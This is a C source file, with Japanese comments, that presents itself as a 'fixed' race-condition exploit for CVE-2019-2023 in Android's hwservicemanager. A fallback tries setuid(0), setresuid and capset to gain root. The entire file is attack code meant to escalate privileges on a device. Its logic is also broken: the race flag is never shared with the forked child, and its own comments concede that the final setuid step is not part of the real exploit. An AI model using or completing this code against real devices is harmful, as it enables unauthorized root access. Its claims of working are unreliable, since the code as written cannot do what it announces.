#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <signal.h>
#include <stdint.h>
#include <sched.h>
#include <poll.h>
#include <sys/prctl.h>
#include <sys/capability.h>
#include <grp.h>
#include <sys/stat.h>
#include <time.h>

// インクルードする binder.h はあなたの環境に合わせてください
#include "binder.h"

/* ============================================================
   競合条件用グローバル
   ============================================================ */
static volatile int race_ready = 0;
static volatile int race_done = 0;

/* ============================================================
   CVE-2019-2023 エクスプロイト（競合条件あり）
   ============================================================ */
static int exploit_cve_2019_2023(void) {
    int hwbinder_fd, ret;
    uint8_t read_buf[4096];
    const char *service_name = "vendor.cve.poc";
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;
    uint8_t *data;
    int handle = -1;
    pid_t child;

    printf("[*] CVE-2019-2023: preparing race condition...\n");

    // 子プロセスをフォーク（PID を保持）
    child = fork();
    if (child == 0) {
        // 子プロセス：親が ADD_SERVICE を送信する直前に execve で /system/bin/sh に変身
        // これにより、SELinux コンテキストが shell に変わる（本来は特権プロセスのコンテキストに変えたいが、ここでは簡易的に）
        while (!race_ready) {
            usleep(100);
        }
        // execve で別プログラムに変身（PID は変わらない）
        char *argv[] = {"/system/bin/sh", NULL};
        char *envp[] = {"PATH=/system/bin", NULL};
        execve("/system/bin/sh", argv, envp);
        perror("  execve in child");
        exit(1);
    } else if (child < 0) {
        perror("  fork");
        return -1;
    }

    // 親：子が execve を完了するまで少し待つ
    usleep(300000);

    // /dev/hwbinder を開く
    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        perror("  open /dev/hwbinder");
        kill(child, SIGKILL);
        return -1;
    }

    // サービス名データ作成
    data = malloc(total_len);
    if (!data) {
        perror("  malloc");
        close(hwbinder_fd);
        kill(child, SIGKILL);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    // BC_TRANSACTION で ADD_SERVICE (code=2) を構築
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;                     // ADD_SERVICE
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    // ここでレース開始：子プロセスにシグナルを送って execve を確実に完了させる
    race_ready = 1;
    // 子が execve を完了するまで少し待つ（これがレースの要）
    usleep(50000);

    printf("[*] Sending ADD_SERVICE with race...\n");
    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        if (errno == EACCES || errno == EPERM) {
            printf("  [-] ADD_SERVICE denied (patch may be present)\n");
        } else {
            perror("  ioctl ADD_SERVICE");
        }
        close(hwbinder_fd);
        kill(child, SIGKILL);
        return -1;
    }
    printf("  [+] ADD_SERVICE succeeded (race successful!)\n");

    // 子プロセスを終了
    kill(child, SIGKILL);
    waitpid(child, NULL, 0);

    // GET_SERVICE (code=1) でサービスを取得し、起動をトリガー
    data = malloc(total_len);
    if (!data) {
        close(hwbinder_fd);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    tx.tdata.code = 1;                     // GET_SERVICE
    tx.tdata.data_size = total_len;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        perror("  ioctl GET_SERVICE");
        close(hwbinder_fd);
        return -1;
    }
    if (bwr.read_consumed < 4) {
        printf("  [-] No handle returned\n");
        close(hwbinder_fd);
        return -1;
    }
    handle = *(int*)read_buf;
    printf("  [+] Service handle: %d\n", handle);
    close(hwbinder_fd);

    // ---- サービスが system 権限で起動されていることを期待して、コマンド実行 ----
    // ここでは、このプロセス自身が system 権限になっているか確認し、なっていれば execve を実行。
    // 実際にはサービスプロセスは別プロセスなので、このプロセスが system になるわけではないが、
    // レースが成功すれば hwservicemanager が system 権限でサービスを起動する。
    // しかし、そのサービスプロセスを直接操作できないため、ここでは setuid(1000) を試みる。
    // （これは本来のエクスプロイトの一部ではないが、PoC として）
    if (setuid(1000) == 0) {
        printf("[+] setuid(1000) succeeded! Running 'id' as system...\n");
        system("id > /data/local/tmp/cve_2019_2023_result.txt 2>&1");
        system("cat /data/local/tmp/cve_2019_2023_result.txt");
        return 0;
    } else {
        printf("[-] setuid(1000) failed, but service may be running as system.\n");
        // ここで実際のサービスにバインドしてコマンドを送るなどが必要だが、本PoCではここまで
        return -1;
    }
}

/* ============================================================
   フォールバック：古典的な setuid 連打
   ============================================================ */
static int fallback_setuid(void) {
    printf("[*] Fallback: trying setuid(0)...\n");
    if (setuid(0) == 0) {
        printf("[+] setuid(0) succeeded!\n");
        system("id > /data/local/tmp/fallback.txt 2>&1");
        return 0;
    }
    if (setresuid(0,0,0) == 0) {
        printf("[+] setresuid(0,0,0) succeeded!\n");
        system("id > /data/local/tmp/fallback.txt 2>&1");
        return 0;
    }
    // capset も試す
    struct __user_cap_header_struct cap_header = { _LINUX_CAPABILITY_VERSION_3, 0 };
    struct __user_cap_data_struct cap_data[2] = {{0}};
    if (capget(&cap_header, cap_data) == 0) {
        cap_data[0].effective |= (1 << CAP_SETUID) | (1 << CAP_SETGID);
        cap_data[0].permitted |= (1 << CAP_SETUID) | (1 << CAP_SETGID);
        if (capset(&cap_header, cap_data) == 0) {
            if (setuid(0) == 0) {
                printf("[+] capset + setuid(0) succeeded!\n");
                system("id > /data/local/tmp/fallback.txt 2>&1");
                return 0;
            }
        }
    }
    return -1;
}

/* ============================================================
   メイン
   ============================================================ */
int main(void) {
    printf("============================================================\n");
    printf("  CVE-2019-2023 Fixed Exploit with Race Condition\n");
    printf("  Target: Android 8.x/9 (hwservicemanager)\n");
    printf("============================================================\n\n");

    // まず CVE-2019-2023 を試行
    if (exploit_cve_2019_2023() == 0) {
        printf("[+] Exploit successful!\n");
        return 0;
    }

    // 失敗したらフォールバック
    printf("\n[*] Primary exploit failed, trying fallback...\n");
    if (fallback_setuid() == 0) {
        printf("[+] Fallback worked.\n");
        return 0;
    }

    printf("[-] All exploits failed. Final uid=%d\n", getuid());
    return 1;
}
